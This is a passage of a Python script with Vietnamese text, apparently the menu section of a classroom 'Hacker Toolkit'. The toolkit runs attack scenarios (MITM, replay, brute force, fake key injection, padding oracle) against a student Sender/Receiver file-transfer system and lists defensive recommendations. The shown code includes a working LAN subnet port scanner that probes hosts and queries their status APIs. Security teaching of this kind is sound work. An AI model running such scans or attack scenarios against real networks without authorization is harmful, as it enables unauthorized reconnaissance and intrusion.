        print(f"{Colors.YELLOW}{Colors.BOLD}  ⚠️  PHÂN TÍCH LỖ HỔNG BẢO MẬT{Colors.RESET}")
        print(f"{Colors.DARK}  • CBC mode dễ bị tấn công Padding Oracle nếu{Colors.RESET}")
        print(f"{Colors.DARK}    hệ thống tiết lộ thông tin lỗi padding{Colors.RESET}")
        print(f"{Colors.DARK}  • Hệ thống hiện tại trả về lỗi chung chung,{Colors.RESET}")
        print(f"{Colors.DARK}    KHÔNG phân biệt giữa lỗi padding và lỗi khác{Colors.RESET}")
        print(f"{Colors.GREEN}  • Đây là cách phòng thủ hiệu quả chống Padding Oracle!{Colors.RESET}")
        print(f"{Colors.GREEN}  • Biện pháp bổ sung: Dùng GCM mode hoặc xác thực MAC trước{Colors.RESET}")
        print_divider("─", 50, Colors.YELLOW)

        print()
        print(f"{Colors.BOLD}{Colors.MAGENTA}  📋 KẾT LUẬN KỊCH BẢN PADDING ORACLE:{Colors.RESET}")
        print(f"  {Colors.GREEN}• Hệ thống an toàn vì không tiết lộ thông tin lỗi padding cụ thể.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Nên dùng AEAD mode (GCM, CCM) để tránh hoàn toàn tấn công này.{Colors.RESET}")
        print(f"  {Colors.GREEN}• Kiểm tra MAC/Integrity hash TRƯỚC khi kiểm tra padding.{Colors.RESET}")

        print_result(False, "Padding Oracle Attack không hiệu quả vì hệ thống không tiết lộ thông tin lỗi padding.")
        return False


# ============================================================
# MENU CHÍNH
# ============================================================

class HackerMenu:
    """Menu chính của Hacker Tool"""

    def __init__(self):
        self.scenarios = {
            "1": {
                "name": "Man-in-the-Middle (MITM)",
                "desc": "Giả mạo cả Sender và Receiver để đánh cắp SessionKey & dữ liệu",
                "obj": MITMAttack(),
                "risk": "CAO",
                "color": Colors.RED
            },
            "2": {
                "name": "Replay Attack",
                "desc": "Phát lại gói tin cũ để đánh lừa hệ thống",
                "obj": ReplayAttack(),
                "risk": "TRUNG BÌNH",
                "color": Colors.YELLOW
            },
            "3": {
                "name": "Brute-force DES (56-bit)",
                "desc": "Vét cạn khóa DES - rất khả thi với GPU hiện đại",
                "obj": BruteForceDES(),
                "risk": "TRUNG BÌNH",
                "color": Colors.YELLOW
            },
            "4": {
                "name": "Brute-force Triple DES (168-bit)",
                "desc": "Vét cạn khóa 3DES - KHÔNG khả thi với công nghệ hiện tại",
                "obj": BruteForce3DES(),
                "risk": "THẤP",
                "color": Colors.GREEN
            },
            "5": {
                "name": "RSA Factoring (1024-bit)",
                "desc": "Phân tích modulus RSA 1024-bit thành p×q",
                "obj": RSAFactoringAttack(),
                "risk": "TRUNG BÌNH",
                "color": Colors.YELLOW
            },
            "6": {
                "name": "Signature Forgery",
                "desc": "Giả mạo chữ ký số RSA",
                "obj": SignatureForgeryAttack(),
                "risk": "THẤP",
                "color": Colors.GREEN
            },
            "7": {
                "name": "Hash Collision SHA-512",
                "desc": "Tìm xung đột hash SHA-512 - KHÔNG khả thi",
                "obj": HashCollisionAttack(),
                "risk": "THẤP",
                "color": Colors.GREEN
            },
            "8": {
                "name": "Network Sniffing",
                "desc": "Nghe lén gói tin UDP broadcast trên mạng LAN",
                "obj": NetworkSniffingAttack(),
                "risk": "CAO",
                "color": Colors.RED
            },
            "9": {
                "name": "Fake Key Injection",
                "desc": "Gửi khóa công khai giả mạo đến Receiver",
                "obj": FakeKeyInjection(),
                "risk": "CAO",
                "color": Colors.RED
            },
            "10": {
                "name": "Padding Oracle Attack",
                "desc": "Khai thác lỗi padding trên CBC mode để giải mã",
                "obj": PaddingOracleAttack(),
                "risk": "THẤP",
                "color": Colors.GREEN
            }
        }

    def print_header(self):
        """In header menu"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  ☠  HACKER TOOLKIT - DANH SÁCH KỊCH BẢN TẤN CÔNG  ☠{Colors.RESET}")
        print_divider("═", 72, Colors.RED)
        print()

    def print_scenarios(self):
        """In danh sách kịch bản"""
        for key, sc in self.scenarios.items():
            risk_color = Colors.RED if sc["risk"] == "CAO" else (Colors.YELLOW if sc["risk"] == "TRUNG BÌNH" else Colors.GREEN)
            print(f"  {Colors.BOLD}{sc['color']}[{key}]{Colors.RESET} "
                  f"{Colors.BOLD}{sc['name']:<35}{Colors.RESET} "
                  f"[{risk_color}Rủi ro: {sc['risk']:<9}{Colors.RESET}]")
            print(f"      {Colors.DARK}{sc['desc']}{Colors.RESET}")
            if int(key) < len(self.scenarios):
                print()

    def print_footer(self):
        """In footer menu"""
        print()
        print_divider("─", 72, Colors.DARK)
        print(f"  {Colors.DARK}[a] Chạy {Colors.BOLD}TẤT CẢ{Colors.RESET}{Colors.DARK} kịch bản | [q] Thoát (Không hack gì cả){Colors.RESET}")
        print(f"  {Colors.DARK}[s] Hiển thị thông tin hệ thống | [h] Cảnh báo an ninh mạng{Colors.RESET}")
        print_divider("═", 72, Colors.DARK)
        print()

    def print_system_info(self):
        """In thông tin hệ thống bảo mật"""
        print()
        print_divider("═", 72, Colors.CYAN)
        print(f"{Colors.BOLD}{Colors.CYAN}  📊 THÔNG TIN HỆ THỐNG BẢO MẬT HIỆN TẠI{Colors.RESET}")
        print_divider("═", 72, Colors.CYAN)
        print()

        info = [
            ("Thuật toán mã hóa file", "Triple DES (168-bit)", "🟢 An toàn"),
            ("Thuật toán mã hóa metadata", "DES (56-bit)", "🟡 Có thể bị brute-force"),
            ("Mã hóa session key", "RSA-OAEP/SHA-256 (1024-bit)", "🟡 Khuyến nghị nâng lên 2048-bit"),
            ("Thuật toán chữ ký", "RSA-PKCS1v1.5/SHA-512", "🟢 An toàn"),
            ("Thuật toán hash", "SHA-512 (512-bit)", "🟢 Rất an toàn"),
            ("Giao thức truyền", "HTTP (không mã hóa kênh)", "🔴 RỦI RO CAO! Dùng HTTPS"),
            ("Xác thực kênh", "Không có TLS/SSL", "🔴 Dễ bị MITM"),
            ("Phát hiện Receiver", "UDP Broadcast (không mã hóa)", "🔴 Lộ thông tin mạng LAN"),
            ("Chống Replay", "Không có nonce/sequence", "🟡 Dễ bị tấn công replay"),
            ("Xác thực Public Key", "Không có CA/certificate", "🔴 Dễ bị Fake Key Injection"),
        ]

        print(f"  {Colors.DARK}{'Thành phần':<40} {'Chi tiết':<40} {'Đánh giá'}{Colors.RESET}")
        print(f"  {Colors.DARK}{'─'*40} {'─'*40} {'─'*15}{Colors.RESET}")
        for comp, detail, assessment in info:
            if "🔴" in assessment:
                assessment_color = Colors.RED
            elif "🟡" in assessment:
                assessment_color = Colors.YELLOW
            else:
                assessment_color = Colors.GREEN
            print(f"  {comp:<40} {detail:<40} {assessment_color}{assessment}{Colors.RESET}")

        print()
        print(f"  {Colors.BOLD}{Colors.MAGENTA}  ĐIỂM BẢO MẬT TỔNG THỂ: 6/10 🟡{Colors.RESET}")
        print(f"  {Colors.DARK}  Điểm mạnh: Mã hóa file bằng 3DES, chữ ký RSA, hash SHA-512{Colors.RESET}")
        print(f"  {Colors.DARK}  Điểm yếu: HTTP trần, thiếu xác thực kênh, broadcast không mã hóa{Colors.RESET}")

    def print_security_warning(self):
        """Cảnh báo an ninh mạng"""
        print()
        print_divider("═", 72, Colors.RED)
        print(f"{Colors.BOLD}{Colors.RED}  ⚠️  CẢNH BÁO AN NINH MẠNG - PHÒNG THỦ CHO HỆ THỐNG THẬT{Colors.RESET}")
        print_divider("═", 72, Colors.RED)
        print()

        warnings = [
            ("1. Sử dụng HTTPS/TLS",
             "Mã hóa toàn bộ kênh truyền giữa Sender và Receiver. Đây là biện pháp QUAN TRỌNG NHẤT để chống MITM."),
            ("2. Chứng chỉ số (Certificate)",
             "Sử dụng CA để xác thực danh tính. Chỉ chấp nhận Public Key đã được ký bởi CA tin cậy."),
            ("3. Pre-Shared Key (PSK)",
             "Trao đổi khóa bí mật trước qua kênh an toàn (SMS, email mã hóa, gặp trực tiếp)."),
            ("4. Nonce & Timestamp",
             "Thêm nonce ngẫu nhiên mỗi phiên + kiểm tra timestamp để chống replay attack."),
            ("5. Nâng cấp DES lên AES",
             "DES 56-bit đã lỗi thời. Dùng AES-256-GCM vừa mã hóa vừa xác thực (AEAD)."),
            ("6. Nâng cấp RSA lên 2048-bit",
             "RSA 1024-bit có thể bị phá vỡ trong tương lai gần. Dùng 2048 hoặc 4096-bit."),
            ("7. Mã hóa UDP Broadcast",
             "Mã hóa gói tin I_AM_RECEIVER hoặc dùng mạng VLAN riêng biệt."),
            ("8. Xác thực hai lớp (2FA)",
             "Thêm lớp xác thực thứ hai cho phiên kết nối (OTP, biometric)."),
            ("9. Giới hạn tần suất (Rate Limiting)",
             "Giới hạn số lần thử kết nối, chống brute-force và DoS attacks."),
            ("10. Kiểm tra toàn vẹn TRƯỚC khi xử lý",
             "Luôn verify hash và chữ ký TRƯỚC khi giải mã và lưu file."),
        ]

        for title, desc in warnings:
            print(f"  {Colors.BOLD}{Colors.YELLOW}{title}{Colors.RESET}")
            print(f"  {Colors.DARK}{desc}{Colors.RESET}")
            print()

    def scan_lan_for_senders(self, timeout=3.0) -> List[dict]:
        """Quét mạng LAN để tìm Sender (port 5001) và Receiver (port 5000) đang chạy"""
        found = []
        print(f"  {Colors.CYAN}📡 Đang quét mạng LAN để tìm Sender & Receiver...{Colors.RESET}")
        
        # Các cổng cần quét
        target_ports = [5000, 5001]
        api_paths = {5000: "Receiver", 5001: "Sender"}
        
        # Lấy địa chỉ mạng LAN
        try:
            hostname = socket.gethostname()
            local_ip = socket.gethostbyname(hostname)
            ip_parts = local_ip.split('.')
            subnet = f"{ip_parts[0]}.{ip_parts[1]}.{ip_parts[2]}"
            
            print(f"  {Colors.DARK}  IP cục bộ: {local_ip}, quét subnet {subnet}.0/24...{Colors.RESET}")
            
            # Quét các IP trong subnet
            for i in range(1, 255):
                ip = f"{subnet}.{i}"
                for port in target_ports:
                    try:
                        test_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        test_sock.settimeout(0.3)
                        result = test_sock.connect_ex((ip, port))
                        test_sock.close()
                        
                        if result == 0:
                            # Cổng mở - thử gọi API status
                            url = f"http://{ip}:{port}"
                            try:
                                resp = requests.get(f"{url}/api/status", timeout=1)
                                data = resp.json()
                                found.append({
                                    "ip": ip,
                                    "port": port,
                                    "url": url,
                                    "type": api_paths.get(port, "Unknown"),
                                    "status": data.get("handshake", False),
                                    "key_exchange": data.get("key_exchange", False)
                                })
                                print(f"  {Colors.GREEN}  ✅ Phát hiện {api_paths.get(port, '?')} tại {url}{Colors.RESET}")
                            except:
                                pass
                    except:
                        continue
                        
            print(f"  {Colors.CYAN}  📡 Hoàn tất quét mạng, tìm thấy {len(found)} thiết bị{Colors.RESET}")
        except Exception as e:
            print(f"  {Colors.YELLOW}  ⚠️ Lỗi quét mạng: {e}, dùng localhost làm mặc định{Colors.RESET}")
            
        return found

    def get_target_urls(self) -> Tuple[str, str]:
        """Tự động quét mạng LAN tìm Sender & Receiver, nếu không có thì dùng mặc định"""
        print()
        print_divider("═", 72, Colors.CYAN)
        print(f"{Colors.BOLD}{Colors.CYAN}  📡 QUÉT MẠNG LAN - TÌM SENDER & RECEIVER{Colors.RESET}")
        print_divider("═", 72, Colors.CYAN)
        print()
        
        # Quét mạng LAN
        discovered = self.scan_lan_for_senders(timeout=3.0)
        
        sender_url = None
        receiver_url = None
        
        if discovered:
            print()
            print(f"{Colors.BOLD}{Colors.WHITE}  Danh sách thiết bị phát hiện trong mạng LAN:{Colors.RESET}")
            print(f"  {Colors.DARK}  {'STT':<5} {'Loại':<12} {'Địa chỉ':<30} {'Trạng thái'}{Colors.RESET}")
            print(f"  {Colors.DARK}  {'─'*5} {'─'*12} {'─'*30} {'─'*15}{Colors.RESET}")
            
            for i, dev in enumerate(discovered, 1):
                status_str = ""
                if dev["type"] == "Sender":
                    status_str = "🟢 Online" if dev.get("key_exchange") else "🟡 Hoạt động"
                else:
                    status_str = "🟢 Online"
                print(f"  {Colors.WHITE}  [{i:<3}] {Colors.RESET} {Colors.CYAN}{dev['type']:<12}{Colors.RESET} {Colors.WHITE}{dev['url']:<30}{Colors.RESET} {status_str}")
            
            print()
            # Tự động phân loại
            senders = [d for d in discovered if d["type"] == "Sender"]
            receivers = [d for d in discovered if d["type"] == "Receiver"]
            
            if senders:
                sender_url = senders[0]["url"]
                print(f"  {Colors.GREEN}  ✅ Tự động chọn Sender: {sender_url}{Colors.RESET}")
            if receivers:
                receiver_url = receivers[0]["url"]
                print(f"  {Colors.GREEN}  ✅ Tự động chọn Receiver: {receiver_url}{Colors.RESET}")
        
        # Nếu không tìm thấy, dùng mặc định
        if not sender_url:
            sender_url = "http://localhost:5001"
            print(f"  {Colors.YELLOW}  ⚠️ Không tìm thấy Sender, dùng mặc định: {sender_url}{Colors.RESET}")
        if not receiver_url:
            receiver_url = "http://localhost:5000"
            print(f"  {Colors.YELLOW}  ⚠️ Không tìm thấy Receiver, dùng mặc định: {receiver_url}{Colors.RESET}")
        
        print()
        print_divider("─", 72, Colors.DARK)
        input(f"  {Colors.DARK}Nhấn Enter để tiếp tục...{Colors.RESET}")
        
        return sender_url, receiver_url

    def run_all(self, sender_url: str, receiver_url: str):
        """Chạy tất cả các kịch bản"""
        print()
        print(f"{Colors.BOLD}{Colors.RED}  ☠  CHẠY TOÀN BỘ {len(self.scenarios)} KỊCH BẢN TẤN CÔNG...  ☠{Colors.RESET}")
        print(f"{Colors.DARK}  {'='*60}{Colors.RESET}")
        print()

        for key, sc in self.scenarios.items():
            print()
            print(f"{Colors.BOLD}{Colors.MAGENTA}  ════ KỊCH BẢN {key}/{len(self.scenarios)}: {sc['name']} ════{Colors.RESET}")
            print(f"{Colors.DARK}  Mô tả: {sc['desc']}{Colors.RESET}")
            print()

            try:
                if key == "1":  # MITM
                    sc["obj"].run(sender_url, receiver_url)
                elif key == "2":  # Replay
                    sc["obj"].run()
                elif key in ["3", "4", "5", "6", "7", "10"]:  # Các kịch bản độc lập
                    sc["obj"].run()
                elif key == "8":  # Sniffing
                    sc["obj"].run(listen_time=6.0)
                elif key == "9":  # Fake Key Injection
                    sc["obj"].run(receiver_url)
            except Exception as e:
                print_status("ERROR", "fail", f"Lỗi khi chạy kịch bản {key}: {e}", Colors.RED)
                traceback.print_exc()

            print()
            print_divider("─", 60, Colors.DARK)
            time.sleep(1)

        print()
        print(f"{Colors.BOLD}{Colors.RED}  ☠  HOÀN THÀNH TẤT CẢ KỊCH BẢN!  ☠{Colors.RESET}")
        print(f"{Colors.DARK}  Hãy xem kết quả từng kịch bản để đánh giá mức độ an toàn của hệ thống.{Colors.RESET}")

    def run(self):
        """Menu chính"""
        print_banner()
        sender_url, receiver_url = self.get_target_urls()

        while True:
            os.system('cls' if os.name == 'nt' else 'clear')
            print_banner()
            self.print_header()
            self.print_scenarios()
            self.print_footer()

            choice = input(f"  {Colors.RED}{Colors.BOLD}☠{Colors.RESET} Chọn kịch bản tấn công (1-10, a=all, s=info, h=warning, q=thoát): ").strip().lower()

            if choice == 'q':
                print(f"\n  {Colors.GREEN}🛡️  Hệ thống an toàn! Hacker đã rút lui...{' ' * 20}{Colors.RESET}")
                print(f"  {Colors.DARK}  (Đây chỉ là mô phỏng giáo dục. Không có dữ liệu thật nào bị đánh cắp.){Colors.RESET}")
                break

            elif choice == 'a':
                self.run_all(sender_url, receiver_url)
                input(f"\n  {Colors.DARK}Nhấn Enter để tiếp tục...{Colors.RESET}")

            elif choice == 's':
                self.print_system_info()
                input(f"\n  {Colors.DARK}Nhấn Enter để tiếp tục...{Colors.RESET}")

            elif choice == 'h':
                self.print_security_warning()
                input(f"\n  {Colors.DARK}Nhấn Enter để tiếp tục...{Colors.RESET}")

            elif choice in self.scenarios:
                sc = self.scenarios[choice]
                print()
                print(f"{Colors.BOLD}{Colors.RED}  ☠  KỊCH BẢN {choice}: {sc['name']}  ☠{Colors.RESET}")
                print(f"{Colors.DARK}  Mô tả: {sc['desc']}{Colors.RESET}")

                try:
                    if choice == "1":
                        sc["obj"].run(sender_url, receiver_url)
                    elif choice == "2":
                        sc["obj"].run()
                    elif choice in ["3", "4", "5", "6", "7", "10"]:
                        sc["obj"].run()
                    elif choice == "8":
                        sc["obj"].run(listen_time=10.0)
                    elif choice == "9":
                        sc["obj"].run(receiver_url)
                except Exception as e:
                    print_status("ERROR", "fail", f"Lỗi: {e}", Colors.RED)

                input(f"\n  {Colors.DARK}Nhấn Enter để quay lại menu...{Colors.RESET}")

            else:
                print(f"\n  {Colors.RED}Lựa chọn không hợp lệ! Vui lòng chọn 1-10, a, s, h, hoặc q.{Colors.RESET}")
                time.sleep(1.5)


# ============================================================
# MAIN
# ============================================================

if __name__ == "__main__":
    try:
        menu = HackerMenu()

        # Nếu có tham số dòng lệnh là "all" thì chạy tất cả không cần menu
        if len(sys.argv) > 1 and sys.argv[1].lower() == "all":
            print_banner()
            sender_url = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:5001"
            receiver_url = sys.argv[3] if len(sys.argv) > 3 else "http://localhost:5000"
            menu.run_all(sender_url, receiver_url)
        else:
            menu.run()

    except KeyboardInterrupt:
        print(f"\n\n  {Colors.YELLOW}⚠️  Hacker bị phát hiện! Đang thoát...{Colors.RESET}")
        print(f"  {Colors.GREEN}🛡️  Hệ thống đã kích hoạt cảnh báo bảo mật!{Colors.RESET}")
    except Exception as e:
        print(f"\n  {Colors.RED}💥 LỖI: {e}{Colors.RESET}")
        traceback.print_exc() 